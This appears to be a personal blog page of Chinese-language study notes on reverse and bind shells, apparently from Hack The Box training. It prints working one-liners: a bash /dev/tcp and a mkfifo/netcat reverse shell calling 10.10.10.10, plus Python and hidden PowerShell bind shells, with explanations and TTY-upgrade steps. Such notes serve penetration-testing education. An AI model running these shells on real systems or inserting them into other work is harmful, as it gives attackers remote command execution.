@@ -1,0 +1,473 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || Reverse Shell</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/like/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/like/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a target="_blank" rel="noopener" href="https://en.korilin.com">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/like/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/like/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a target="_blank" rel="noopener" href="https://en.korilin.com">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>Reverse Shell </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/6/11
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/base" style=color:#03a9f4>
+                    base
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <p>#初见反弹shell</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md</a></p>
+<h3 id="反弹类型："><a href="#反弹类型：" class="headerlink" title="反弹类型："></a>反弹类型：</h3><table>
+<thead>
+<tr>
+<th><code>Reverse Shell</code></th>
+<th>连接回我们的系统，并通过反向连接让我们控制。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Bind Shell</code></td>
+<td>等待我们连接到它，并在我们这样做后给我们控制权。</td>
+</tr>
+<tr>
+<td><code>Web Shell</code></td>
+<td>通过 Web 服务器进行通信，通过 HTTP 参数接受我们的命令，执行它们，然后打印输出。</td>
+</tr>
+</tbody></table>
+<pre><code>Tanin@htb[/htb]$ nc -lvnp 1234
+
+listening on [any] 1234 ...
+</code></pre>
+<p>我们使用的标志如下：</p>
+<p>###nc标志</p>
+<table>
+<thead>
+<tr>
+<th>旗</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-l</code></td>
+<td>收听模式，等待连接连接到我们。</td>
+</tr>
+<tr>
+<td><code>-v</code></td>
+<td>详细模式，以便我们知道何时收到连接。</td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td>禁用 DNS 解析并仅从 IP 连接到 IP，以加快连接速度。</td>
+</tr>
+<tr>
+<td><code>-p 1234</code></td>
+<td>端口号正在侦听，应将反向连接发送到。<code>netcat</code></td>
+</tr>
+</tbody></table>
+<p>##Reverse Shell</p>
+<p>###载荷1：</p>
+<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;
+</code></pre>
+<p>在命令行中，<code>bash -c</code> 和 <code>-i</code> 是 <code>bash</code> shell 的选项和参数。</p>
+<ul>
+<li><code>-c</code> 选项用于在命令行上执行指定的命令。它允许您在不启动新的交互式 <code>bash</code> 会话的情况下执行一条命令。后面应跟随要执行的命令。例如，<code>bash -c &#39;echo Hello, World!&#39;</code> 将执行 <code>echo Hello, World!</code> 这个命令，并在输出中打印 “Hello, World!”。</li>
+<li><code>-i</code> 参数是交互式模式的意思。它使 <code>bash</code> shell 在启动后成为交互式的，以便用户可以与 shell 进行交互。通常在需要与 shell 进行交互的脚本或命令中使用 <code>-i</code> 参数。例如，<code>bash -i</code> 将启动一个交互式 <code>bash</code> shell。</li>
+</ul>
+<p>在提供的命令中，<code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#123;ip&#125; 0&gt;&amp;1&#39;</code> 结合了这两个选项和参数。它使用 <code>-c</code> 选项来执行指定的命令，而该命令是 <code>bash -i &gt;&amp; /dev/tcp/&#123;ip&#125; 0&gt;&amp;1</code>。这将启动一个交互式 <code>bash</code> shell，并将其标准输出（文件描述符 1）重定向到 <code>/dev/tcp/&#123;ip&#125;</code>，并将标准输入（文件描述符 0）重定向到标准输出。这种配置通常用于建立反向 shell 连接。请注意，<code>&#123;ip&#125;</code> 应该被替换为实际的 IP 地址。</p>
+<h2 id="Bind-Shell"><a href="#Bind-Shell" class="headerlink" title="Bind Shell"></a>Bind Shell</h2><p>###载荷2：</p>
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f
+</code></pre>
+<p>提供的命令涉及一系列操作，包括创建命名管道（named pipe），使用<code>cat</code>命令将管道的输出传递给<code>/bin/sh</code>并建立反向 shell 连接。</p>
+<p>具体来说，这个命令的含义如下：</p>
+<ol>
+<li><code>rm /tmp/f</code>: 删除 <code>/tmp/f</code> 文件（如果存在）。</li>
+<li><code>mkfifo /tmp/f</code>: 创建一个命名管道文件 <code>/tmp/f</code>。</li>
+<li><code>cat /tmp/f | /bin/sh -i 2&gt;&amp;1</code>: 使用<code>cat</code>命令读取管道 <code>/tmp/f</code> 的内容，并将其传递给<code>/bin/sh</code>来执行，<code>-i</code>选项表示以交互式方式运行 shell。</li>
+<li><code>nc 10.10.10.10 1234 &gt;/tmp/f</code>: 使用<code>nc</code>命令（netcat）建立到 <code>10.10.10.10</code> IP 地址、端口 <code>1234</code> 的反向 shell 连接，并将连接的输入输出重定向到管道 <code>/tmp/f</code>。</li>
+</ol>
+<p>总体上，这个命令的目的是在本地主机上建立一个反向 shell 连接，将输入输出流通过命名管道 <code>/tmp/f</code> 传输，并通过<code>nc</code>命令将流重定向到远程主机 <code>10.10.10.10</code> 的端口 <code>1234</code> 上。</p>
+<h4 id="什么是管道文件："><a href="#什么是管道文件：" class="headerlink" title="什么是管道文件："></a>什么是管道文件：</h4><p>管道文件（Named pipe）是一种特殊类型的文件，它允许不同进程之间通过文件系统进行通信。它提供了一个双向的、先进先出（FIFO）的通信通道，允许一个进程将数据写入管道的一端，而另一个进程可以从管道的另一端读取相同的数据。</p>
+<p>管道文件在操作系统中以文件的形式存在，但实际上它们并不存储任何数据，而是将数据直接传递给读取它们的进程。<strong>当一个进程写入管道时，数据将被缓存并传递给读取进程，以便进程之间进行通信</strong>。</p>
+<p>管道文件的创建使用特定的命令或系统调用，如在Linux中的<code>mkfifo</code>命令或<code>mkfifo()</code>系统调用。它们可以在命令行中使用，也可以在脚本或程序中以编程方式使用。</p>
+<p>管道文件在进程间通信（IPC）中非常有用，特别是当需要在不同的进程之间传递数据或进行协作时。它们可以用于多个进程之间的实时数据传输、数据处理管道和进程间同步等场景。管道文件提供了一种简单而有效的方式来实现进程之间的通信，而无需使用复杂的进程间通信机制。</p>
+<h3 id="载荷3："><a href="#载荷3：" class="headerlink" title="载荷3："></a>载荷3：</h3><pre><code>python -c &#39;exec(&quot;&quot;&quot;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&quot;0.0.0.0&quot;,1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&quot;&quot;&quot;)&#39;
+</code></pre>
+<p>整理一下：</p>
+<pre><code>python -c &#39;exec(&quot;&quot;&quot;import socket as s,subprocess as sp;
+s1=s.socket(s.AF_INET,s.SOCK_STREAM);
+s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);
+s1.bind((&quot;0.0.0.0&quot;,1234));s1.listen(1);c,a=s1.accept();
+\nwhile True: d=c.recv(1024).decode();
+p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);
+c.sendall(p.stdout.read()+p.stderr.read())&quot;&quot;&quot;)&#39;
+</code></pre>
+<p>chatgpt解释：</p>
+<pre><code>import socket as s, subprocess as sp
+
+# 导入所需的模块，包括 socket 和 subprocess
+
+s1 = s.socket(s.AF_INET, s.SOCK_STREAM)
+# 创建一个 TCP socket 对象
+
+s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
+# 设置 socket 选项，允许地址复用
+
+s1.bind((&quot;0.0.0.0&quot;, 1234))
+# 将 socket 绑定到本地地址和指定的端口号
+
+s1.listen(1)
+# 开始监听传入的连接请求，参数 1 表示允许的最大连接数为 1
+
+c, a = s1.accept()
+# 接受客户端的连接请求，并返回一个新的 socket 对象和客户端的地址
+
+while True:
+    d = c.recv(1024).decode()
+    # 接收从客户端发送过来的数据（命令），并进行解码
+
+    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
+    # 使用 subprocess.Popen 创建一个新的子进程，并执行接收到的命令
+
+    c.sendall(p.stdout.read() + p.stderr.read())
+    # 将子进程的标准输出和标准错误输出发送回客户端
+</code></pre>
+<p>这个脚本创建了一个 TCP socket 服务器，监听在本地地址（”0.0.0.0”）的端口号 1234 上。当客户端连接成功后，它将无限循环等待客户端发送的命令。每次接收到命令后，它使用 <code>subprocess.Popen</code> 创建一个新的子进程，并在子进程中执行该命令。然后，脚本将子进程的标准输出和标准错误输出发送回客户端。</p>
+<p> <code> p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)</code>:</p>
+<p>这行代码使用 <code>subprocess.Popen</code> 创建一个新的子进程，并执行从客户端接收到的命令。</p>
+<p>具体解析如下：</p>
+<ul>
+<li><code>d</code> 是从客户端接收到的命令字符串，它将作为子进程要执行的命令。</li>
+<li><code>shell=True</code> 表示要在子进程中使用系统的默认 shell 来解释和执行命令。</li>
+<li><code>stdout=sp.PIPE</code> 指定子进程的标准输出将通过管道进行捕获，以便稍后读取。</li>
+<li><code>stderr=sp.PIPE</code> 指定子进程的标准错误输出也通过管道进行捕获，以便稍后读取。</li>
+<li><code>stdin=sp.PIPE</code> 表示可以通过管道将输入提供给子进程的标准输入。</li>
+</ul>
+<p>综合起来，这行代码的作用是创建一个新的子进程，使用系统的默认 shell 执行从客户端接收到的命令，并通过管道捕获子进程的标准输出、标准错误输出和标准输入。这样，我们可以在主程序中通过管道读取子进程的输出和错误信息，以及将输入发送给子进程。</p>
+<p>通过这种方式，父进程可以与子进程进行双向通信，向子进程发送输入，并获取子进程的输出和错误信息。这在反向 shell 的实现中非常常见，允许远程控制端发送命令给被控制端，并获取执行结果。</p>
+<p>###载荷4：</p>
+<pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close();
+</code></pre>
+<p>这个脚本使用 PowerShell 创建一个反向 shell 服务端，监听在指定的端口号 1234 上，并隐藏其执行过程。</p>
+<p>以下是对每行代码的解析：</p>
+<ul>
+<li><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command</code>: 这是执行 PowerShell 脚本的命令行参数，它设置了一些选项来隐藏 PowerShell 窗口并绕过执行策略。</li>
+<li><code>$listener = [System.Net.Sockets.TcpListener]1234; $listener.start();</code>: 创建一个 <code>TcpListener</code> 对象并将其绑定到本地地址的端口 1234 上，并开始监听传入的连接请求。</li>
+<li><code>$client = $listener.AcceptTcpClient();</code>: 接受客户端的连接请求，并返回一个新的 <code>TcpClient</code> 对象，用于与客户端进行通信。</li>
+<li><code>$stream = $client.GetStream();</code>: 获取与客户端连接的网络流，用于发送和接收数据。</li>
+<li><code>[byte[]]$bytes = 0..65535|%&#123;0&#125;;</code>: 创建一个字节数组，用于存储从客户端接收的数据。</li>
+<li><code>while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)</code>: 进入一个无限循环，不断接收从客户端发送的数据。</li>
+<li><code>$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);</code>: 将接收到的字节数组转换为字符串，以便获取从客户端发送的命令。</li>
+<li><code>$sendback = (iex $data 2&gt;&amp;1 | Out-String );</code>: 执行从客户端接收到的命令，并将输出结果保存到 <code>$sendback</code> 变量中。</li>
+<li><code>$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot; &quot;;</code>: 在输出结果后添加当前 PowerShell 会话的路径信息。</li>
+<li><code>$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);</code>: 将输出结果转换为 ASCII 字节，以便发送给客户端。</li>
+<li><code>$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()</code>: 将字节发送回客户端，并刷新网络流</li>
+</ul>
+<p>##升级 TTY</p>
+<p>通过Netcat连接到shell后，我们会注意到我们只能键入命令或退格键，但我们不能向左或向右移动文本光标来编辑我们的命令，也不能上下访问命令历史记录。为了能够做到这一点，我们需要升级我们的 TTY。这可以通过将我们的终端 TTY 与远程 TTY 映射来实现。</p>
+<p>有多种方法可以做到这一点。出于我们的目的，我们将使用该方法。在我们的 shell 中，我们将使用以下命令使用 python 将我们的 shell 类型升级到完整的 TTY：<code>python/stty``netcat</code></p>
+<p>  升级 TTY</p>
+<pre><code>Tanin@htb[/htb]$ python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<p>运行此命令后，我们将点击后台我们的 shell 并返回我们的本地终端，并输入以下命令：<code>ctrl+z``stty</code></p>
+<pre><code>www-data@remotehost$ ^Z
+
+Tanin@htb[/htb]$ stty raw -echo
+Tanin@htb[/htb]$ fg
+
+[Enter]
+[Enter]
+www-data@remotehost$
+</code></pre>
+<p>一旦我们击中，它将把我们的外壳带回前台。此时，终端将显示一个空行。我们可以再次点击以返回我们的外壳或输入并按回车键将其带回。此时，我们将拥有一个完全工作的TTY shell，其中包含命令历史记录和其他所有内容。<code>fg``netcat``enter``reset</code></p>
+<p>我们可能会注意到我们的外壳没有覆盖整个终端。为了解决这个问题，我们需要找出一些变量。我们可以在系统上打开另一个终端窗口，最大化窗口或使用我们想要的任何大小，然后输入以下命令来获取我们的变量：</p>
+<pre><code>Tanin@htb[/htb]$ echo $TERM
+
+xterm-256color
+</code></pre>
+<pre><code>Tanin@htb[/htb]$ stty size
+
+67 318
+</code></pre>
+<p>第一个命令向我们显示了变量，第二个命令分别向我们显示了 和 的值。现在我们有了变量，我们可以回到我们的 shell 并使用以下命令来纠正它们：<code>TERM``rows``columns``netcat</code></p>
+<pre><code>www-data@remotehost$ export TERM=xterm-256color
+
+www-data@remotehost$ stty rows 67 columns 318
+</code></pre>
+<p>一旦我们这样做了，我们应该有一个使用终端全部功能的 shell，就像 SSH 连接一样。<code>netcat</code></p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
